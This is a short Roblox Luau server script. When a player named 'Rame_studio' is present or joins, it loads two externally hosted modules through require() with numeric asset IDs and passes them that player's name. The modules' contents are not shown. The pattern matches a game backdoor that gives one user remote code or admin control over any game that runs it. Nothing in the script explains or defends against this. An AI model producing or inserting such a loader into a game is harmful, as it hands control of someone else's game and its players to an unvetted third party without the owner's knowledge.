local Players = game:GetService("Players")
local executed = false

local function executeForRameStudio()
    if not executed then
        local player = Players:FindFirstChild("Rame_studio")
        if player then
            require(2609384717).load("Rame_studio")
            require(10868847330):pls("Rame_studio")
            executed = true
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    if player.Name == "Rame_studio" then
        executeForRameStudio()
    end
end)

-- Check if the player is already in the game when the script starts
executeForRameStudio()
